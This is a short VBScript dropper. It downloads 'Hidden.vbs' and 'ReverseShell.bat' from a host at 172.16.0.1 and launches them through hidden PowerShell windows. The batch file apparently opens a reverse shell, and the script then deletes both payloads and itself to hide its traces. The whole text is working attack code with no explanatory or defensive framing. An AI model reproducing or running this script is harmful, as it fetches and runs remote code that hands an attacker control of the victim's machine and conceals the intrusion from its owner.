Set File = WScript.CreateObject("Microsoft.XMLHTTP")
Set BS = CreateObject("ADODB.Stream")
Set Hook = CreateObject("WScript.Shell")
BS.type = 1
File.Open "GET", "http://172.16.0.1/Hidden.vbs", False
File.Send
BS.open
BS.Write File.ResponseBody
BS.SaveToFile ".\Hidden.vbs", 2
BS.close

File.Open "GET", "http://172.16.0.1/ReverseShell.bat", False
File.Send
BS.open
BS.Write File.ResponseBody
BS.SaveToFile ".\ReverseShell.bat", 2
BS.close

Hook.Run "powershell.exe -WindowStyle Hidden .\Hidden.vbs /BatFile:.\ReverseShell.bat"
WScript.Sleep 1000
Hook.Run "powershell.exe -WindowStyle Hidden rm .\Hidden.vbs, .\ReverseShell.bat, .\Hook.vbs"
